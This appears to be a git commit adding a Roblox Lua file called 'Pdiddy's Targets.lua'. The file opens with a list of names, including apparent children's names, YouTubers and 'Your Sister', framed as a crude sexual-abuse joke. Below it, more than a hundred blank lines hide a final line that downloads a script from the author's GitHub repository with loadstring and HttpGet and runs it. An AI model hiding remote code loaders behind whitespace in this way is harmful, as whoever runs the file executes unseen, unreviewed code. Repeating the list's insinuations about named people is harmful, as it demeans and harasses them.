2c211bc53b203cb12dc833d5ca3e5b675f343d39
SuperHackerYT <htutm5132@gmail.com>
2025-06-30 18:03:59 +0630

    Create Pdiddy's Targets.lua

---
+++ Pdiddy's Targets.lua
@@ -0,0 +1,154 @@
+-- Timmy
+-- Emily
+-- Sarah
+-- Trofi
+-- Sofia
+-- Ninja Balls
+-- Oakley
+-- Sakon
+-- Roblox
+-- Your Mom
+-- Your Dad
+-- Your Grandma
+-- Your Sister
+-- Your Ex
+-- Your Friend
+-- Your Siblings
+-- Your Cousins
+-- Big Jimmy
+-- Jamal
+-- Hakunamatata
+-- Ami Oya
+-- Kreekcraft
+-- Elvis Presley
+-- LeBron Preston
+-- Preston Plays
+-- Oofblox
+-- idk
+-- lllllllllllilly
+-- gaya
+-- Nvmana
+-- Hs9s
+-- c00lkidd
+-- bluudud
+-- gisos
+-- enderman
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SuperHackerYT/skibidi/refs/heads/main/script.lua'))()
